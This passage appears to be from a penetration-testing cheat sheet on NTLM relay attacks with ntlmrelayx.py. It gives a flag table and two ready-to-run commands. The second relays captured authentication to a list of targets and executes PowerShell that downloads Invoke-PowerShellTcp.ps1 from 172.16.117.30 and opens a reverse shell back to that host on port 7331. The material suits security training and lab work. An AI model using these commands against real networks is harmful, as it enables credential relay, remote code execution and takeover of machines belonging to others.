used in NTLM relay attacks


| flags          | Discription                                                                     |
| -------------- | ------------------------------------------------------------------------------- |
| `-t`<br>`-tf`  | specifies a single relay target<br>specifies a file with multiple relay targets |
| `-smb2support` | provides SMBv2 support for hosts requiring it                                   |
| `-c`           | Command To Execute, and the commands will be executed via `SMB`.                |


### Start relaying
```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
```

### Command execute using relaying
```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 7331"
```